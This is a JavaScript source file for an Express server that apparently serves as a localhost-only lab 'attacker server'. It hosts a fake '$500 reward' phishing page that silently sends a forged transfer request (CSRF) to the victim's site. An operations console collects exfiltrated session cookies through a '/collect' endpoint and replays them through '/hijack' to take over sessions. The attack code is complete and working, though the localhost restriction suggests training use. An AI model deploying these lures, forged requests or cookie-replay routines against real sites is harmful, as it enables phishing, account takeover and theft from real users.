import express from 'express';

const inbox = [];

function localTarget(value) {
  try {
    const url = new URL(value);
    if (!['localhost', '127.0.0.1'].includes(url.hostname)) return null;
    if (!['http:', 'https:'].includes(url.protocol)) return null;
    return url.origin;
  } catch {
    return null;
  }
}

const styles = `
  :root { color-scheme: light; --bg:#f7f7f4; --panel:#ffffff; --surface:#f1f1ed; --line:#deded7; --line-strong:#c9c9c0; --text:#1a1a18; --muted:#6c6c65; --muted-2:#8a8a82; --danger:#7c3434; }
  * { box-sizing: border-box; }
  body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); font-size:14px; }
  .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 22px 60px; }
  header { display:flex; justify-content:space-between; align-items:center; gap:16px; border-bottom:1px solid var(--line); padding-bottom:18px; margin-bottom:26px; }
  .brand { display:flex; align-items:center; gap:11px; }
  .logo { width:34px; height:34px; border-radius:6px; background:var(--panel); border:1px solid var(--line-strong); display:grid; place-items:center; font-weight:600; font-size:13px; color:var(--text); }
  h1 { font-size:18px; font-weight:600; margin:0; letter-spacing:-.015em; }
  .sub { color:var(--muted); font-size:11.5px; margin-top:2px; }
  .badge { border:1px solid var(--line); color:var(--muted); padding:4px 9px; border-radius:4px; font-size:10px; letter-spacing:.04em; text-transform:uppercase; background:var(--surface); }
  .cols { display:grid; grid-template-columns:1.1fr .9fr; gap:14px; }
  @media (max-width:820px){ .cols { grid-template-columns:1fr; } }
  .card { background:var(--panel); border:1px solid var(--line); border-radius:8px; padding:22px; }
  .card h2 { margin:0 0 6px; font-size:16px; font-weight:600; }
  .card p { color:var(--muted); font-size:12.5px; line-height:1.65; margin:6px 0 14px; }
  .tag { display:inline-block; font-size:9.5px; letter-spacing:.04em; text-transform:uppercase; color:var(--muted); border:1px solid var(--line); padding:3px 7px; border-radius:4px; margin-bottom:10px; background:var(--surface); }
  .prize { border:1px dashed var(--line-strong); border-radius:6px; padding:20px; text-align:center; margin:18px 0; background:var(--surface); }
  .prize b { color:var(--text); font-size:26px; font-weight:600; display:block; margin-bottom:5px; }
  .btn { appearance:none; border:1px solid var(--text); background:var(--text); color:#ffffff; padding:9px 14px; border-radius:5px; font-weight:500; font-size:12px; cursor:pointer; text-decoration:none; display:inline-block; }
  .btn:hover { background:#33332f; }
  .btn.ghost { background:var(--panel); border:1px solid var(--line-strong); color:var(--muted); }
  .btn.ghost:hover { color:var(--text); background:var(--surface); }
  .btn.small { padding:6px 9px; font-size:10.5px; }
  code, pre { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
  code { font-size:11px; background:var(--surface); border:1px solid var(--line); border-radius:3px; padding:1px 4px; color:var(--text); }
  pre { background:var(--surface); border:1px solid var(--line); border-radius:5px; padding:11px; overflow:auto; font-size:10.5px; color:var(--text); line-height:1.65; }
  .status { display:flex; gap:7px; align-items:center; font-size:11px; color:var(--muted); margin-top:12px; }
  .dot { width:5px; height:5px; border-radius:50%; background:var(--danger); }
  .inbox { display:flex; flex-direction:column; gap:8px; max-height:390px; overflow:auto; }
  .entry { border:1px solid var(--line); background:var(--surface); border-radius:5px; padding:11px; }
  .entry .meta { display:flex; justify-content:space-between; gap:10px; font-size:10px; color:var(--muted-2); margin-bottom:6px; }
  .entry .data { word-break:break-all; font-size:11px; color:var(--text); }
  .empty { color:var(--muted-2); font-size:12px; padding:18px; text-align:center; border:1px dashed var(--line-strong); border-radius:5px; }
  .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
  .hijack { margin-top:10px; border-top:1px solid var(--line); padding-top:10px; font-size:11px; color:var(--muted); white-space:pre-wrap; word-break:break-word; }
  .foot { margin-top:30px; color:var(--muted-2); font-size:10.5px; line-height:1.7; border-top:1px solid var(--line); padding-top:16px; display:flex; justify-content:space-between; gap:16px; flex-wrap:wrap; }
  .hidden { display:none !important; }
  .warn { color:var(--danger); }
  .fine { color:var(--muted-2); font-size:10px; margin-top:18px; }
  .navlink { color:var(--muted-2); font-size:10.5px; }
  .navlink:hover { color:var(--text); }
`;

function rewardsPage(defaultTarget) {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>PerkPoint — Member Rewards</title>
<style>${styles}</style>
</head>
<body>
<div class="wrap">
  <header>
    <div class="brand">
      <div class="logo">P</div>
      <div><h1>PerkPoint</h1><div class="sub">Member rewards</div></div>
    </div>
    <span class="badge">Rewards partner</span>
  </header>

  <div class="cols">
    <section class="card">
      <span class="tag">Member offer</span>
      <h2>You've unlocked a $500 reward</h2>
      <p>As a valued member of our rewards programme, you have $500 in bonus credit waiting. Confirm your membership below to claim it.</p>
      <div class="prize"><b>$500</b><span>Bonus credit available</span></div>
      <div class="row">
        <button class="btn" id="claimBtn">Claim my reward</button>
        <a class="btn ghost" href="/terms.html">Terms apply</a>
      </div>
      <div class="status"><span class="dot"></span><span id="claimStatus">Checking your membership…</span></div>
      <p class="fine">PerkPoint is an independent rewards programme. This offer is available for a limited time.</p>
    </section>

    <section class="card">
      <span class="tag">How it works</span>
      <h2>Rewards, made simple</h2>
      <p>Bonus credit is added to your account after membership confirmation. No forms, no waiting, no fees.</p>
      <p>Millions of members redeem rewards every month through our partner network.</p>
      <div class="status"><span class="dot"></span><span>Trusted by 2.4 million members</span></div>
    </section>
  </div>

  <div class="foot">
    <span>© PerkPoint Rewards</span>
    <a class="navlink" href="/ops">Operations</a>
  </div>
</div>
<script>
  const DEFAULT_TARGET = ${JSON.stringify(defaultTarget)};
  const params = new URLSearchParams(location.search);
  const rawTarget = params.get('target') || DEFAULT_TARGET;
  let target = DEFAULT_TARGET;
  try {
    const u = new URL(rawTarget);
    if (['localhost', '127.0.0.1'].includes(u.hostname)) target = u.origin;
  } catch {}

  // The offer confirmation is a silent image request. A real rewards page
  // would never need to contact the member's procurement portal.
  const forgedUrl = target + '/api/account/transfer?to=mallory&amount=500&source=perkpoint';
  const img = new Image();
  img.src = forgedUrl + '&t=' + Date.now();
  img.onload = img.onerror = () => {
    document.getElementById('claimStatus').textContent = 'Membership confirmed. Your reward is on its way.';
  };

  document.getElementById('claimBtn').addEventListener('click', () => {
    const probe = new Image();
    probe.src = forgedUrl + '&t=' + Date.now();
    document.getElementById('claimStatus').textContent = 'Your reward is being processed.';
  });
</script>
</body>
</html>`;
}

function opsPage(defaultTarget) {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>PerkPoint — Operations</title>
<style>${styles}</style>
</head>
<body>
<div class="wrap">
  <header>
    <div class="brand">
      <div class="logo">P</div>
      <div><h1>PerkPoint</h1><div class="sub">Operations console · localhost only</div></div>
    </div>
    <span class="badge">Internal</span>
  </header>

  <div class="cols">
    <section class="card">
      <span class="tag">Campaign response</span>
      <h2>Forged request</h2>
      <p>This is the request the rewards page sends. It uses the visitor's existing account session and does not require any credentials.</p>
      <pre id="packet">GET <span id="packetUrl"></span>
Host: <span id="packetHost"></span>
Cookie: northwind_session=&lt;attached by the browser&gt;</pre>
      <div class="status"><span class="dot"></span><span id="attackStatus">Waiting for a visitor.</span></div>
      <p class="warn" style="display:none" id="csrfHint"></p>
    </section>

    <section class="card">
      <span class="tag">Collected data</span>
      <h2>Campaign inbox</h2>
      <p>Review content that makes a callback to this origin appears here automatically.</p>
      <div class="row" style="margin-bottom:10px">
        <button class="btn ghost small" id="refreshBtn">Refresh</button>
        <button class="btn ghost small" id="clearBtn">Clear</button>
      </div>
      <div class="inbox" id="inbox"><div class="empty">No entries yet.</div></div>
      <div id="hijackResult" class="hijack hidden"></div>
    </section>
  </div>

  <div class="foot">
    <span>PerkPoint operations · internal preview</span>
    <a class="navlink" href="/">Back to rewards page</a>
  </div>
</div>
<script>
  const DEFAULT_TARGET = ${JSON.stringify(defaultTarget)};
  const params = new URLSearchParams(location.search);
  const rawTarget = params.get('target') || DEFAULT_TARGET;
  let target = DEFAULT_TARGET;
  try {
    const u = new URL(rawTarget);
    if (['localhost', '127.0.0.1'].includes(u.hostname)) target = u.origin;
  } catch {}
  const forgedUrl = target + '/api/account/transfer?to=mallory&amount=500&source=perkpoint';
  document.getElementById('packetUrl').textContent = forgedUrl;
  document.getElementById('packetHost').textContent = new URL(target).host;

  async function loadInbox() {
    const box = document.getElementById('inbox');
    try {
      const response = await fetch('/inbox');
      const data = await response.json();
      if (!data.entries.length) {
        box.innerHTML = '<div class="empty">No entries yet.</div>';
        return;
      }
      box.innerHTML = '';
      for (const entry of data.entries) {
        const el = document.createElement('div');
        el.className = 'entry';
        const meta = document.createElement('div');
        meta.className = 'meta';
        const time = document.createElement('span');
        time.textContent = new Date(entry.time).toLocaleTimeString();
        const source = document.createElement('span');
        source.textContent = entry.referer || entry.userAgent || 'payload';
        meta.append(time, source);
        const dataEl = document.createElement('div');
        dataEl.className = 'data';
        dataEl.textContent = entry.data;
        const hijack = document.createElement('button');
        hijack.className = 'btn ghost small';
        hijack.style.marginTop = '10px';
        hijack.textContent = 'Use session →';
        hijack.addEventListener('click', () => hijackSession(entry.data));
        el.append(meta, dataEl, hijack);
        box.appendChild(el);
      }
    } catch {
      box.innerHTML = '<div class="empty">Could not reach the server.</div>';
    }
  }

  async function hijackSession(cookieData) {
    const out = document.getElementById('hijackResult');
    out.classList.remove('hidden');
    out.textContent = 'Replaying the cookie against the storefront…';
    try {
      const response = await fetch('/hijack', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ cookie: cookieData, target })
      });
      const data = await response.json();
      out.textContent = data.ok
        ? 'SESSION ACCEPTED\\n' + JSON.stringify(data.session, null, 2)
        : 'Replay failed: ' + (data.error || 'unknown error');
    } catch (error) {
      out.textContent = 'Replay request failed: ' + error.message;
    }
  }

  document.getElementById('refreshBtn').addEventListener('click', loadInbox);
  document.getElementById('clearBtn').addEventListener('click', async () => {
    await fetch('/inbox/clear', { method: 'POST' });
    loadInbox();
  });
  loadInbox();
  setInterval(loadInbox, 5000);
</script>
</body>
</html>`;
}

export function startAttackerServer(port, defaultTarget) {
  const app = express();
  app.use(express.json({ limit: '64kb' }));
  app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    next();
  });

  app.get('/', (_req, res) => res.type('html').send(rewardsPage(defaultTarget)));
  app.get('/ops', (_req, res) => res.type('html').send(opsPage(defaultTarget)));
  app.get('/terms.html', (_req, res) => res.type('html').send('<h1>Terms</h1><p>Demo page.</p>'));

  app.get('/collect', (req, res) => {
    inbox.unshift({
      time: new Date().toISOString(),
      data: String(req.query.data ?? '(empty)').slice(0, 4000),
      referer: String(req.get('referer') || '').slice(0, 200),
      userAgent: String(req.get('user-agent') || '').slice(0, 200)
    });
    if (inbox.length > 50) inbox.length = 50;
    res.type('gif').send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64'));
  });

  app.get('/inbox', (_req, res) => res.json({ entries: inbox }));

  app.post('/inbox/clear', (_req, res) => {
    inbox.length = 0;
    res.json({ ok: true });
  });

  app.post('/hijack', async (req, res) => {
    const target = localTarget(req.body?.target || defaultTarget);
    if (!target) return res.status(400).json({ ok: false, error: 'Only localhost targets are allowed.' });

    const cookie = String(req.body?.cookie || '');
    const match = cookie.match(/(?:^|;\s*)northwind_session=([^;]+)/);
    if (!match) return res.status(400).json({ ok: false, error: 'No northwind_session cookie found in the captured data.' });

    try {
      const response = await fetch(target + '/api/auth/me', {
        headers: { cookie: `northwind_session=${match[1]}` }
      });
      const session = await response.json();
      res.json({ ok: response.ok, status: response.status, session });
    } catch (error) {
      res.status(500).json({ ok: false, error: error.message });
    }
  });

  app.listen(port, '127.0.0.1', () => {
    console.log(`  Rewards page      ->  http://localhost:${port}`);
  });
}

export { inbox };
